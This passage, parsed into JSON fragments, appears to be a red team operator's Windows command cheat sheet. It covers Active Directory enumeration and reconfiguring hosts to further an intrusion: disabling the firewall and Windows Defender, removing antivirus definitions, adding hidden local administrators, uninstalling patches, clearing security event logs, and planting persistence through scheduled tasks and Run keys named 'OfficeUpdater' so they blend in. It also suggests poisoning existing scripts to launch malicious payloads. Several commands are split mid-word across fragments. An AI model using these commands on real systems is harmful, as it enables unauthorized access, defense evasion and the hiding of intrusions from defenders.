      "content": "Display users in a domain group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net group \"Domain Controllers\" /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display domain controllers in the current domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net group \"Domain Computers\" /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all computer hostnames for current domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user <USERNAME> /ACTIVE:YES /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Unlock domain user account",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user <USERNAME> \"<PASSWORD>\" /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Change domain user password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with DSQuery",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "All DSQuery commands must be run from a machine that has dsquery.exe on disk (commonly Windows Server) and most of the commands DO NOT require administrative privileges.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(&(objectclass=user)(admincount=1))\" -attr samaccountname name",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display administrative users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"((objectclass=user))\" -attr name samaccountname > <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Output dsquery results to disk",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "makecab <INPUT_PATH> <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress dsquery results",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "expand <INPUT_PATH> <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract dsquery results",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(objectclass=organizationalUnit)\" -attr name distinguishedName description -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display Active Directory OUs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(operatingsystem=*10*)\" -attr name operatingsystem dnshostname -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display computers filtering on operating system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(name=*DC*)\" -attr name operatingsystem dnshostname -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display all computers with a pattern in the hostname (*DC*)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(name=*smith*)\" -attr name samaccountname description -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all Active Directory objects with a pattern SMITH in the hostname. Great for finding user objects!",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with DSQuery Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(&(objectclass=user)(lastlogon><EPOCH_TIME>))\" -attr samaccountname name",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Filter on EPOCH time (password last changed, last login, etc.)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "with 12 0's is a day in epoch (1000000000000). Add or subtract to adjust dsquery filter",
      "level": 1,
      "metadata": {
        "number": "1"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(objectclass=trusteddomain)\" -attr flatname trustdirection",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display trusts associated with current domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(operatingsystem=*server*)\" -attr name operatingsystem description dnshostname -d <DOMAIN_FQDN>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display active directory objects in a remote domain (useful if trust exists)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(objectclass=computer)\" -attr name dnshostname operatingsystem description -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display computers with helpful attributes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(objectclass=user)\" -attr name samaccountname lastlogon memberof description -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display users with helpful attributes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(objectclass=group)\" -attr name samaccountname member description -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display groups with helpful attributes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(name=*admin*)\" -attr name samaccountname description objectclass -limit 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display every Active Directory object with admin in the name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w32tm /ntte <EPOCH_TIME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Convert NT epoch time (lastLogonTimestamp time format) to readable",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Finding User System in a Windows Domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wevtutil qe security /rd:true /f:text /q:\"*[System/EventID=4624] and *[EventData/Data[@Name='TargetUserName']='<USERNAME>']\" /c:20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query EventLogs for user logins looking for system that was logged into.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "May need to be run from all DCs in domain to locate proper event log.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is case sensitive.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Can be run remotely with credentials with the following argument:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/r:<IP_ADDRESS>>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dsquery * -filter \"(description=*<USER_LAST_NAME>*)\" -attr name samaccountname description",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Utilize dsquery to search for user's last name in description (searches all AD objects). Occasionally user workstation information could be stored in Active Directory objects or description",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Connect to any server (likely a file server) that could have active user home directories mapped",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows [Re]Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section covers re-configuration of Windows which can be used to further a potential red team assessment. A few examples include enabling remote desktop protocol, adding firewall rules, or creating accounts.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Remote Desktop Protocol (RDP) Configuration",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc start TermService",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enable RDP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add “\\\\<IP_ADDRESS>\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Optional: Can execute technique remotely by interacting with remote registry",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Change RDP Listening Port Number (Need to restart RDP Service)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc [Re]Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rundll32 user32.dll,LockWorkStation",
      "level": 0,
      "metadata": {
        "file_paths": [
          "user32.dll"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Lock workstation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh advfirewall set currentprofile state off",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh advfirewall set allprofiles state off",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disable Windows firewall",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.1",
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Remove",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Native Windows port forward (* must be admin)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 0 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Re-enable command prompt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic product get name /value",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic product where name=\"XXX\" call uninstall /nointeractive",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List software names and uninstall software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v IPEnableRouter /t REG_DWORD /d 1 /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Turn on IP forwarding",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net share sharename=<SHARE_FOLDER> /GRANT:everyone,FULL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "icacls <FILE_PATH> /grant Everyone:(F) /T",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Share a folder with full permissions to everyone",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user <USERNAME> <PASSWORD> /ADD",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net localgroup \"Administrators\" <USERNAME> /ADD",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add a local user and place in the local administrators group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wusa /uninstall /kb:4516059 /quiet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Uninstall a patch",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "del <FILE_PATH>\\*.* /S /Q /F",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Forcibly delete all files from specified directory and all subdirectories",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disable WIndows Defender",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc config WinDefend start= disabled",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disable service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc stop WinDefend",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stop service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set-MpPreference -DisableRealtimeMon",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "itoring $true",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell command to disable real time monitoring",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\"%ProgramFiles%\\Windows Defe",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nder\\MpCmdRun.exe\" -RemoveDefi",
      "level": 0,
      "metadata": {
        "file_paths": [
          "nder\\MpCmdRun.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nitions -All",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell command to remove virus definitions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Event Viewer Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wevtutil cl Application /bu:<FILE_PATH>.evtx",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Backup the Application log and then clear all events",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wevtutil qe Application /c:20 /rd:true /f:text",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display the 20 most recent events from the application log",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wevtutil qe security /q:”*[System[(EventID=4624)]]” /c:100 /rd:true",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display the last 100 logon events",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "date = (Get-Date).AddHours(-24); Get-WinEvent –FilterHashTable @{ logname = ”Security”; STARTTIME = $date; ID = 4624}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display all logon events during the last 24 hours (PowerShell)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-EventLog –list",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Clear-EventLog -LogName Application, Security",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Clear Security & Application event log (PowerShell)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Prefetch Location:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SYSTEMROOT%\\Prefetch",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Prefetch filename structure:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<APPLICATION_NAME>-<8 CHAR HASH OF LOCATION>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Additional meta data:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "-executable name (up to 29 chars)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-number of times the application has been executed",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-volume related information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-files and directories used during application start-up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Prefetch [11]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "More info at: https://forensicswiki.xyz/wiki/index.php?title=Windows_Prefetch_File_Format",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Level Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important and useful user level persistence techniques. Since they are “user level” they do not require any administrative privileges and most of them execute on user log in.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scheduled Task User Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary and add scheduled task pointing at that uploaded binary. Can change OfficeUpdater to a task name that blends into target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /Create /F /SC DAILY /ST 09:00 /TN OfficeUpdater /TR <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add user level task that executes at 9:00AM daily",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /query /tn OfficeUpdater /fo list /v",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query task in verbose mode",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /delete /tn OfficeUpdater /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Key User Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary and add run key value pointing at uploaded binary. Can change OfficeUpdater to run key value that blends into target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V OfficeUpdater /t REG_SZ /F /D “<FILE_PATH>”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add key",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query key",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V OfficeUpdater",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete key",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Startup Directories",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary to a specific “startup” folder. All files in this folder are executed on user login.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "All users:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Specific users:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SystemDrive%\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows NT 6.1, 6.0, Windows 10, Windows 11",
      "level": 0,
      "metadata": {
        "file_paths": [
          "6.1",
          "6.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows NT 5.2, 5.1, 5.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "5.2",
          "5.1",
          "5.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SystemDrive%\\wmiOWS\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 9x",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows NT 4.0, 3.51, 3.50",
      "level": 0,
      "metadata": {
        "file_paths": [
          "4.0",
          "3.51",
          "3.50"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "at.exe Schedule (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "at HH:MM <FILE_PATH> [ARGS]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Schedule task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "at <TASK_ID> /delete",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Poisoning Existing scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate all user persistence methods discussed in this section looking for existing persistence that has been created via script files such as .bat, .ps1, etc. If those are modifiable by a basic user, modify them to launch a malicious uploaded payload. Just beware, if the script is on a file server it could be executed by many users.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System Level Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important and useful SYSTEM level persistence techniques. Since they are “SYSTEM” they will require administrative privileges and most of them execute during system startup.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Schtasks on Boot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary to system folder and create scheduled task pointing at that binary for execution. Can change OfficeUpdater to a different task name that blends into target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /query /tn OfficeUpdater /fo list /v",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query task in verbose mode",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /delete /tn OfficeUpdater /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
